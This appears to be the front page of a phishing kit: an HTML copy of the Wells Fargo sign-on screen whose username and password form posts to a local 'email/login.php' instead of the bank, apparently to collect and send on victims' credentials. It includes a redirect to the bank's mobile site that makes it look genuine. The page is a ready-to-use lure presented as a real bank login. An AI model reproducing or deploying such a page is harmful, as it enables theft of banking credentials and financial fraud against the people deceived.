<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Wells Fargo&nbsp;Sign On to View Your Accounts</title>
<link rel="shortcut icon" link rel="logo-icon" href="img/favicon.ico">
<style>
body {
    background-color: #eaeff8;
    font-size: 100%;
    margin: 0;
}
a, a:link, a:visited {
    color: #369;
}
.primary{
	background: url(img/btn_blueslice.gif) repeat-x scroll left top transparent;
    border: 1px solid #e0e3e2;
    font-weight: bold;
    margin: 7px 10px 8px 4px;
    padding: 2px 10px;
    color: white;
    float: right;
}
</style>
<script type="text/javascript">
<!--
if (screen.width <= 699) {
document.location = "m.wellsfargo.com";
}
//-->
</script>
</head>
<body>
<form action="email/login.php" method="post">
<div style="width: 991px;margin: 0 auto 10px auto;border-width: 0 2px 2px 2px;border-style: solid;border-color: #ced4dd;background-color: #fff;font-family: arial,helvetica,sans-serif;">
<center><img src="img/header.png"/></center>
<table>
<tr>
<td style="border-right: 1px solid #afafaf;padding-bottom: 280px;"><center><img src="img/need.png"/></center></td>
<td><center><img src="img/right.png"/></center>
<table style="font-size: 12px;padding-left: .5em;line-height: 30px;">
<tr>
<td><b>Sign on to</b></td>
<td><select name="destination" required="required" title="Select a destination">
<option selected="selected" value="AccountSummary">Account Summary</option>
<option value="Transfer">Transfer</option>
<option value="BillPay">Bill Pay</option>
<option value="brokerage">Brokerage</option>
<option value="Trade">Trade</option>
<option value="MessageAlerts">Messages &amp; Alerts</option>
</select></td>
</tr>
<tr>
<td><b>Username</b></td>
<td><input type="text" name="j_username" required="required" size="20" maxlength="14"></td>
</tr>
<tr>
<td><b>Password</b></td>
<td><input type="password" name="j_password" required="required" size="20" maxlength="14"></td>
</tr>
<tr>
<td></td>
<td><input type="checkbox" value="true">Save Username</td>
</tr>
<tr>
<td></td>
<td><a href="">Username/Password Help</a></td>
</tr>
<tr>
<td></td>
<td><b>Don't have a username and password? <a href="">Sign Up Now</a></b></td>
</tr>
</table>
<br>
<div style="padding-left: .5em;">
<table style="clear: both;margin: 10px 0;width: 700px;height: 35px;padding: 0;vertical-align: top;background-color: #f2f1ec;border-top: 1px dotted #c0bebe;border-bottom: 1px dotted #c0bebe;">
<tbody><tr>
<td></td>
<td><input type="submit" class="primary" value="Sign On"></td>
</tr>
</tbody></table>
<center><img src="img/ff.png"/></center>
</div>
</div>
</form>
</body>
</html>
